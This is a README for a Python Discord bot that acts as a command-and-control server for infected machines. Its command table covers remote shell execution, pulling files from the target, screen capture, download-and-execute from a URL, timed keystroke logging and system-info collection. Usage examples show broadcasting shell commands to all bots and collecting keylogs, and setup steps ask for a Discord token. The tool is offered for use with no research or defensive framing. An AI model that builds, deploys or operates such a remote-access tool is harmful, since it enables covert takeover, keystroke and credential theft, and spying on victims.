# C2 Python Discord Bot

## What's "C2 Discord bot" ?

> The C2 Discord bot utilizes the Discord's Developer functionality that allows you to make bots capable to interager with the user acting like a Command and Control Server.

<br>

### Before continue you must follow the steps covered on [Discord's Documentaion](https://discordpy.readthedocs.io/en/stable/discord.html).

<br>

## C2 Discord bot commands:

Command | Functions
----------|-----------
$b | All bots receive commands
$wake | Show active bots
$shell \<cmd\>| Execute a command on target system
$upload \<file\>| Download a arbitrary file from target system
$grab | Screen capture from target system
$down_exec \<url\>| Download a file to target system and execute it
$klogging \<sec\>| Start keystroke logging on target system
$sysinfo | Get information from target system

<br>

## Examples:

<br>


In the following example all bots will return stdout from the shell command.

<code> $b $shell dir *.png </code>
  
Or if you want to interact with only one specific bot:

 <code>$Bot-name $shell dir *.png</code>

---
Get the keystroke logger every 30 seconds. The bot will send to you in a .txt format:

<code>$b $klogging 30</code>

<br>

## Remember:
- Put your discord token in 'PUT YOUR TOKEN HERE' in the <text>botDiscord.py</text> file.
- Replace '000000' in the <text>botDiscord.py</text> file to your user id.
